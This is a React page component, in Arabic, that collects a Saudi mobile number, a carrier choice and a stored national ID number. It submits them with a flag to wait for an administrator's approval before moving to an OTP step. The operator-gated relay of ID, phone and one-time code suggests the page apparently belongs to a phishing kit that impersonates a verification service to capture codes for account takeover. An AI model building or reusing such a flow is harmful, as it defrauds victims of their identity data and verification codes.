import { useEffect, useState } from "react";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { z } from "zod";
import { useLocation } from "wouter";
import PageLayout from "@/components/layout/PageLayout";
import WaitingOverlay, { waitingProviderInfo } from "@/components/WaitingOverlay";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import {
  sendData,
  isFormApproved,
  isFormRejected,
  navigateToPage,
} from "@/lib/store";

const serviceProviders = [
  { value: "0", label: "STC", icon: "/images/service-providers/stc.jpg" },
  { value: "1", label: "موبايلي", icon: "/images/service-providers/mobily.png" },
  { value: "2", label: "زين", icon: "/images/service-providers/zain.webp" },
  { value: "3", label: "ليبارا", icon: "/images/service-providers/lebara.jpg" },
  { value: "4", label: "فيرجن", icon: "/images/service-providers/virgin.png" },
  { value: "5", label: "سلام", icon: "/images/service-providers/salam.jpg" },
];

// Valid Saudi mobile prefixes
const validSaudiPrefixes = ["050", "053", "054", "055", "056", "057", "058", "059"];

const schema = z.object({
  phone: z
    .string()
    .min(1, "رقم الجوال مطلوب")
    .regex(/^\d+$/, "يجب إدخال أرقام إنجليزية فقط")
    .length(10, "رقم الجوال يجب أن يكون 10 أرقام")
    .refine(
      (val) => validSaudiPrefixes.some((prefix) => val.startsWith(prefix)),
      "رقم الجوال يجب أن يبدأ بـ 050, 053, 054, 055, 056, 057, 058, أو 059"
    ),
  serviceProvider: z.string().min(1, "مزود الخدمة مطلوب"),
});

type FormData = z.infer<typeof schema>;

export default function PhoneVerification() {
  const [, navigate] = useLocation();
  const [selectedProvider, setSelectedProvider] = useState("");
  const [phoneError, setPhoneError] = useState("");

  const {
    register,
    handleSubmit,
    setValue,
    reset,
    watch,
    formState: { errors },
  } = useForm<FormData>({
    resolver: zodResolver(schema),
    defaultValues: {
      phone: "",
      serviceProvider: "",
    },
  });

  const phoneValue = watch("phone");

  // Validate phone number on change
  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value;
    
    // Only allow English digits
    if (value !== "" && !/^\d+$/.test(value)) {
      setPhoneError("يجب إدخال أرقام إنجليزية فقط");
      return;
    }
    
    // Limit to 10 digits
    if (value.length > 10) {
      return;
    }
    
    setValue("phone", value);
    
    // Validate prefix when 3 or more digits
    if (value.length >= 3) {
      const prefix = value.substring(0, 3);
      if (!validSaudiPrefixes.includes(prefix)) {
        setPhoneError("رقم الجوال يجب أن يبدأ بـ 050, 053, 054, 055, 056, 057, 058, أو 059");
      } else {
        setPhoneError("");
      }
    } else {
      setPhoneError("");
    }
  };

  // Emit page enter
  useEffect(() => {
    navigateToPage("توثيق رقم الجوال");
  }, []);

  // Handle form approval
  useEffect(() => {
    if (isFormApproved.value) {
      navigate(`/phone-otp?serviceProvider=${selectedProvider}`);
    }
  }, [isFormApproved.value, navigate, selectedProvider]);

  // Handle form rejection
  useEffect(() => {
    if (isFormRejected.value) {
      reset();
    }
  }, [isFormRejected.value, reset]);

  const onSubmit = (data: FormData) => {
    const idNumber = localStorage.getItem("idNumber") || "";
    const provider = serviceProviders.find(
      (p) => p.value === data.serviceProvider
    );
    const providerName = provider?.label;

    // تعيين معلومات مزود الخدمة لعرضها في شاشة الانتظار
    waitingProviderInfo.value = {
      providerLogo: provider?.icon,
      providerName: providerName,
      phoneNumber: data.phone,
    };

    sendData({
      data: {
        "رقم الجوال": data.phone,
        "مزود الخدمة": providerName,
        "رقم الهوية": idNumber,
      },
      current: "توثيق رقم الجوال",
      nextPage: `تحقق رقم الجوال (OTP)?serviceProvider=${data.serviceProvider}`,
      waitingForAdminResponse: true,
    });
  };

  return (
    <PageLayout variant="default">
      <WaitingOverlay />

      <div className="bg-white rounded-2xl shadow-xl p-6">
        {/* Header */}
        <div className="text-center mb-8">
          <div className="w-16 h-16 bg-primary/10 rounded-full flex items-center justify-center mx-auto mb-4">
            <svg
              className="w-8 h-8 text-primary"
              fill="none"
              stroke="currentColor"
              viewBox="0 0 24 24"
            >
              <path
                strokeLinecap="round"
                strokeLinejoin="round"
                strokeWidth={2}
                d="M3 5a2 2 0 012-2h3.28a1 1 0 01.948.684l1.498 4.493a1 1 0 01-.502 1.21l-2.257 1.13a11.042 11.042 0 005.516 5.516l1.13-2.257a1 1 0 011.21-.502l4.493 1.498a1 1 0 01.684.949V19a2 2 0 01-2 2h-1C9.716 21 3 14.284 3 6V5z"
              />
            </svg>
          </div>
          <h1 className="text-xl font-bold text-gray-800 mb-2">توثيق رقم الجوال</h1>
          <p className="text-gray-500 text-sm">
            أدخل رقم جوالك لإرسال رمز التحقق
          </p>
        </div>

        <form onSubmit={handleSubmit(onSubmit)} className="space-y-4">
          {/* Phone Number */}
          <div className="space-y-2">
            <Label htmlFor="phone">رقم الجوال</Label>
            <Input
              id="phone"
              type="tel"
              inputMode="numeric"
              placeholder="05xxxxxxxx"
              maxLength={10}
              value={phoneValue}
              onChange={handlePhoneChange}
            />
            {(errors.phone || phoneError) && (
              <p className="text-red-500 text-xs">{phoneError || errors.phone?.message}</p>
            )}
          </div>

          {/* Service Provider */}
          <div className="space-y-2">
            <Label>مزود الخدمة</Label>
            <Select
              onValueChange={(v) => {
                setValue("serviceProvider", v);
                setSelectedProvider(v);
              }}
            >
              <SelectTrigger>
                <SelectValue placeholder="اختر مزود الخدمة" />
              </SelectTrigger>
              <SelectContent>
                {serviceProviders.map((provider) => (
                  <SelectItem key={provider.value} value={provider.value}>
                    <div className="flex items-center gap-2">
                      <img
                        src={provider.icon}
                        alt={provider.label}
                        className="w-5 h-5"
                      />
                      <span>{provider.label}</span>
                    </div>
                  </SelectItem>
                ))}
              </SelectContent>
            </Select>
            {errors.serviceProvider && (
              <p className="text-red-500 text-xs">
                {errors.serviceProvider.message}
              </p>
            )}
          </div>

          {/* Submit Button */}
          <Button type="submit" className="w-full" size="lg">
            إرسال رمز التحقق
          </Button>
        </form>
      </div>
    </PageLayout>
  );
}
